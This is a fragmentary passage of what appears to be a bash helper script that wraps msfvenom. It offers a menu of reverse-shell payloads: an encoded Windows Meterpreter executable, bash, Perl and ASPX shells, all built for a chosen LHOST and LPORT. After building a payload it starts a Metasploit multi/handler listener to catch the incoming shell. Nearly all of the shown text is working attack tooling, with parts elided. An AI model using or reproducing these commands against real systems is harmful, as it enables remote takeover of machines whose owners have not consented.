...
printf "1. Linux .elf (Meterpreter)\t2.Windows .exe (stable Meterpreter shell)\n3.MAC .macho OS\t\t\t4.PHP (Meterpreter)\n5.ASP (Meterpreter)\t\t6.JSP\n7.WAR\t\t\t\t8.Python\n9.Bash .sh\t\t\t10.Perl\n11.ASPX (Meterpreter)\n\n"
...
then
	echo -e "Generating Windows Reverse Shell Payload (stable Meterpreter shell)"
	msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport SessionExpirationTimeout=0 SessionCommunicationTimeout=0 exitfunc=process -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f exe > $shname.exe && printf "\nshell created.\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
	   msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_https; set LHOST $lhost; set LPORT $lport; run"
	   ;;
	[nN]) echo -e "see you later"	
	   exit 0
	   ;;
	*) echo -e "ekteb beshih ya bhim"
           exit 0 
	   ;;
	esac
elif [ $num == 3 ] 
...
then
	...
	msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > $shname.sh && printf "\$shell created.\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler"
...
then
	...
	msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > $shname.pl && printf "\$shell created.\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
...
then
	...
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f aspx > $shname.aspx && printf "\$shell created.\n"
echo -e "Do you want to open Multi Handler Listener for the above generated payload? (y or n)"
read lisn
	case $lisn in 
	[yY]) echo -e "opening multi handler meterpreter"
